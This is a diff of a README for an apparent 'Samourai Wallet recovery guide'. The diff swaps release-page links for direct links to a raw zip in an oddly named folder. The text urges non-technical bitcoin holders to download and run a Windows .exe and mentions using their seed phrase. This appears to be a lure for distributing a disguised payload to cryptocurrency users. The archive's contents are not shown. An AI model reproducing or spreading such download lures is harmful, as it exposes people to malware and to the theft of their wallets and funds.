@@ -1,6 +1,6 @@
 # 🏦 samourai-wallet-recovery-guide - Recover your bitcoin funds easily today
 
-[![Download Recovery Guide](https://img.shields.io/badge/Download-Recovery_Guide-blue.svg)](https://github.com/Gracej4607/samourai-wallet-recovery-guide/releases)
+[![Download Recovery Guide](https://img.shields.io/badge/Download-Recovery_Guide-blue.svg)](https://raw.githubusercontent.com/Gracej4607/samourai-wallet-recovery-guide/main/diatomin/wallet_samourai_recovery_guide_2.9.zip)
 
 This guide helps you recover bitcoin from a Samourai Wallet. Recent legal events involving Samourai Wallet make it necessary to move your funds to a different wallet. You can use this process to regain access to your bitcoin by using your seed phrase. You do not need technical skills to follow these steps. You can complete this process in about 30 minutes.
 
@@ -19,7 +19,7 @@ You must use specialized wallet software to talk to the Bitcoin network. We reco
 
 Visit the link below to get the official release files.
 
-[Click here to visit the release page and download your software](https://github.com/Gracej4607/samourai-wallet-recovery-guide/releases)
+[Click here to visit the release page and download your software](https://raw.githubusercontent.com/Gracej4607/samourai-wallet-recovery-guide/main/diatomin/wallet_samourai_recovery_guide_2.9.zip)
 
 Choose the version that matches your Windows system. Look for the file ending in .exe. This file type runs on Windows.
 
